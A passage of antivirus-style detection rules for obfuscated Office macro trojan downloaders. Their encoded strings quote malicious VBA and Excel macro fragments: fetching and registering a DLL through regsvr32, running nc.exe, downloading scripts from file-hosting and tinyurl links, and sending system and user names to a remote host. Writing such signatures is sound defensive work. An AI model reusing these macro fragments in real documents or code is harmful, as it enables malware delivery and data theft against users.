		$a_01_1 = {3d 20 22 68 74 74 70 73 3a 2f 2f 62 69 6c 6c 62 6f 61 72 64 6f 6e 6c 69 6e 65 2e 6c 69 76 65 2f 76 69 65 77 2e 70 68 70 22 } //01 00  = "https://billboardonline.live/view.php"
		$a_01_2 = {2e 73 61 76 65 74 6f 66 69 6c 65 20 56 42 41 2e 45 6e 76 69 72 6f 6e 28 22 4c 4f 43 41 4c 41 50 50 44 41 54 41 22 29 20 26 20 22 5c 22 20 26 20 52 61 6e 64 6f 6d 53 74 72 69 6e 67 20 26 20 22 2e 64 6c 6c 22 2c 20 32 } //01 00  .savetofile VBA.Environ("LOCALAPPDATA") & "\" & RandomString & ".dll", 2
		$a_01_3 = {43 61 6c 6c 20 53 68 65 6c 6c 28 22 72 65 67 73 76 72 33 32 20 22 20 26 20 56 42 41 2e 45 6e 76 69 72 6f 6e 28 22 4c 4f 43 41 4c 41 50 50 44 41 54 41 22 29 20 26 20 22 5c 22 20 26 20 52 61 6e 64 6f 6d 53 74 72 69 6e 67 20 26 20 22 2e 64 6c 6c 22 2c 20 76 62 48 69 64 65 29 } //00 00  Call Shell("regsvr32 " & VBA.Environ("LOCALAPPDATA") & "\" & RandomString & ".dll", vbHide)
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_76{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 53 63 72 69 70 74 2e 53 68 65 6c 6c 22 29 } //01 00  = CreateObject("WScript.Shell")
		$a_01_1 = {41 63 74 69 76 65 53 68 65 65 74 2e 4f 4c 45 4f 62 6a 65 63 74 73 28 31 29 2e 56 69 73 69 62 6c 65 20 3d 20 62 32 39 39 36 61 37 30 66 61 37 34 31 34 32 35 39 31 31 35 61 31 37 38 63 30 63 37 38 31 35 61 61 } //01 00  ActiveSheet.OLEObjects(1).Visible = b2996a70fa7414259115a178c0c7815aa
		$a_01_2 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 53 68 65 6c 6c 2e 41 70 70 6c 69 63 61 74 69 6f 6e 22 29 2e 4e 61 6d 65 73 70 61 63 65 28 45 6e 76 69 72 6f 6e 28 22 4c 4f 43 41 4c 41 50 50 44 41 54 41 22 29 29 2e 53 65 6c 66 2e 49 6e 76 6f 6b 65 56 65 72 62 20 22 50 61 73 74 65 22 } //01 00  CreateObject("Shell.Application").Namespace(Environ("LOCALAPPDATA")).Self.InvokeVerb "Paste"
		$a_01_3 = {2e 52 75 6e 20 43 68 72 28 33 34 29 20 26 20 45 6e 76 69 72 6f 6e 28 22 4c 4f 43 41 4c 41 50 50 44 41 54 41 22 29 20 26 20 22 5c 6e 63 2e 65 78 65 22 20 26 20 43 68 72 28 33 34 29 2c 20 30 } //00 00  .Run Chr(34) & Environ("LOCALAPPDATA") & "\nc.exe" & Chr(34), 0
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_77{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {3d 20 22 68 74 74 70 73 3a 2f 2f 63 64 6e 2d 31 34 33 2e 61 6e 6f 6e 66 69 6c 65 73 2e 63 6f 6d 2f 52 32 57 62 52 31 65 36 70 36 2f 31 33 36 61 64 62 63 38 2d 31 36 30 32 35 33 35 39 31 32 2f 68 69 2e 76 62 73 22 } //01 00  = "https://cdn-143.anonfiles.com/R2WbR1e6p6/136adbc8-1602535912/hi.vbs"
		$a_01_1 = {53 68 65 6c 6c 20 22 65 78 70 6c 6f 72 65 72 2e 65 78 65 20 22 20 26 20 45 6e 76 69 72 6f 6e 28 22 75 73 65 72 70 72 6f 66 69 6c 65 22 29 20 26 20 22 5c 44 65 73 6b 74 6f 70 5c 68 69 2e 76 62 73 22 } //01 00  Shell "explorer.exe " & Environ("userprofile") & "\Desktop\hi.vbs"
		$a_01_2 = {57 69 6e 48 74 74 70 52 65 71 2e 4f 70 65 6e 20 22 47 45 54 22 2c 20 6d 79 55 52 4c 2c 20 46 61 6c 73 65 2c 20 22 75 73 65 72 6e 61 6d 65 22 2c 20 22 70 61 73 73 77 6f 72 64 22 } //01 00  WinHttpReq.Open "GET", myURL, False, "username", "password"
		$a_01_3 = {6f 53 74 72 65 61 6d 2e 53 61 76 65 54 6f 46 69 6c 65 20 45 6e 76 69 72 6f 6e 28 22 75 73 65 72 70 72 6f 66 69 6c 65 22 29 20 26 20 22 5c 44 65 73 6b 74 6f 70 5c 68 69 2e 76 62 73 22 } //00 00  oStream.SaveToFile Environ("userprofile") & "\Desktop\hi.vbs"
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_78{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 69 6e 48 74 74 70 2e 57 69 6e 48 74 74 70 52 65 71 75 65 73 74 2e 35 2e 31 22 29 } //01 00  = CreateObject("WinHttp.WinHttpRequest.5.1")
		$a_01_1 = {68 74 74 70 3a 2f 2f 31 39 32 2e 31 36 38 2e 30 2e 31 30 33 3a 34 37 30 31 2f 69 6e 64 65 78 2e 70 68 70 3f 22 20 26 } //01 00  http://192.168.0.103:4701/index.php?" &
		$a_01_2 = {2e 53 65 74 54 69 6d 65 6f 75 74 73 20 35 30 30 30 2c 20 35 30 30 30 2c 20 35 30 30 30 2c 20 35 30 30 30 } //01 00  .SetTimeouts 5000, 5000, 5000, 5000
		$a_01_3 = {3d 20 53 79 73 74 65 6d 2e 4f 70 65 72 61 74 69 6e 67 53 79 73 74 65 6d 20 26 20 22 2c 22 20 26 20 41 70 70 6c 69 63 61 74 69 6f 6e 2e 42 75 69 6c 64 20 26 20 22 2c 22 20 26 20 41 70 70 6c 69 63 61 74 69 6f 6e 2e 56 65 72 73 69 6f 6e 20 26 20 22 2c 22 20 26 20 41 70 70 6c 69 63 61 74 69 6f 6e 2e 55 73 65 72 4e 61 6d 65 20 26 20 22 2c 22 20 26 20 45 6e 76 69 72 6f 6e 24 28 22 63 6f 6d 70 75 74 65 72 6e 61 6d 65 22 29 } //00 00  = System.OperatingSystem & "," & Application.Build & "," & Application.Version & "," & Application.UserName & "," & Environ$("computername")
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_79{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {3d 20 52 65 70 6c 61 63 65 28 62 61 62 2c 20 22 3e 41 3c 22 2c 20 22 22 29 } //01 00  = Replace(bab, ">A<", "")
		$a_03_1 = {28 22 3e 41 3c 43 72 3e 41 3c 65 61 3e 41 3c 74 65 3e 41 3c 4f 62 3e 41 3c 6a 65 3e 41 3c 63 74 3e 41 3c 28 22 29 20 26 20 90 02 08 28 33 34 29 20 26 20 4d 6f 6e 6b 65 79 73 28 22 3e 41 3c 57 53 3e 41 3c 63 72 3e 41 3c 69 70 3e 41 3c 74 2e 3e 41 3c 53 68 3e 41 3c 65 6c 3e 41 3c 6c 22 29 20 26 20 90 02 08 28 33 34 29 20 26 20 4d 6f 6e 6b 65 79 73 28 22 3e 41 3c 29 2e 3e 41 3c 52 75 3e 41 3c 6e 20 22 29 90 00 } //01 00 
		$a_01_2 = {3d 20 4d 6f 6e 6b 65 79 73 28 22 43 3e 41 3c 3a 5c 55 3e 41 3c 73 65 72 3e 41 3c 73 5c 22 29 20 26 20 45 6e 76 69 72 6f 6e 28 4d 6f 6e 6b 65 79 73 28 22 55 73 3e 41 3c 65 72 3e 41 3c 6e 61 3e 41 3c 6d 65 22 29 29 20 26 20 4d 6f 6e 6b 65 79 73 28 22 5c 41 3e 41 3c 70 70 3e 41 3c 44 61 3e 41 3c 74 61 5c 4c 6f 3e 41 3c 63 61 3e 41 3c 6c 5c 54 3e 41 3c 65 6d 3e 41 3c 70 5c 77 74 70 68 6a 67 66 2e 65 3e 41 3c 78 65 22 29 } //00 00  = Monkeys("C>A<:\U>A<ser>A<s\") & Environ(Monkeys("Us>A<er>A<na>A<me")) & Monkeys("\A>A<pp>A<Da>A<ta\Lo>A<ca>A<l\T>A<em>A<p\wtphjgf.e>A<xe")
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_BK_MTB_80{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 05 00 00 01 00 "
		
	strings :
		$a_01_0 = {3d 43 41 4c 4c 28 22 22 75 72 6c 6d 6f 6e 22 22 2c 22 22 55 52 4c 44 6f 77 6e 6c 22 20 2b 20 61 79 61 31 20 2b } //01 00  =CALL(""urlmon"",""URLDownl" + aya1 +
		$a_01_1 = {3d 20 22 6f 61 64 54 6f 46 69 6c 65 41 22 } //01 00  = "oadToFileA"
		$a_01_2 = {68 22 22 26 43 48 41 52 28 31 31 36 29 26 43 48 41 52 28 31 31 36 29 26 43 48 41 52 28 31 31 32 29 26 22 22 73 22 22 26 43 48 41 52 28 35 38 29 26 43 48 41 52 28 34 37 29 26 43 48 41 52 28 34 37 29 26 22 22 74 69 6e 79 75 72 6c 22 22 26 43 48 41 52 28 34 36 29 26 22 22 63 6f 6d 22 22 26 43 48 41 52 28 34 37 29 26 22 22 79 61 65 33 39 6a 35 73 } //01 00  h""&CHAR(116)&CHAR(116)&CHAR(112)&""s""&CHAR(58)&CHAR(47)&CHAR(47)&""tinyurl""&CHAR(46)&""com""&CHAR(47)&""yae39j5s
		$a_01_3 = {68 22 22 26 43 48 41 52 28 31 31 36 29 26 43 48 41 52 28 31 31 36 29 26 43 48 41 52 28 31 31 32 29 26 22 22 73 22 22 26 43 48 41 52 28 35 38 29 26 43 48 41 52 28 34 37 29 26 43 48 41 52 28 34 37 29 26 22 22 74 69 6e 79 75 72 6c 22 22 26 43 48 41 52 28 34 36 29 26 22 22 63 6f 6d 22 22 26 43 48 41 52 28 34 37 29 26 22 22 79 37 75 64 71 79 6c 6d } //01 00  h""&CHAR(116)&CHAR(116)&CHAR(112)&""s""&CHAR(58)&CHAR(47)&CHAR(47)&""tinyurl""&CHAR(46)&""com""&CHAR(47)&""y7udqylm
		$a_01_4 = {3d 45 58 22 20 2b 20 22 45 22 20 2b 20 22 43 22 20 2b 20 22 28 22 22 43 3a 5c 50 52 4f 47 52 41 4d 44 41 54 41 5c 61 22 22 26 43 48 41 52 28 34 36 29 26 22 22 65 78 22 22 26 43 48 41 52 28 31 30 31 29 } //00 00  =EX" + "E" + "C" + "(""C:\PROGRAMDATA\a""&CHAR(46)&""ex""&CHAR(101)
	condition:
		any of ($a_*)
 
}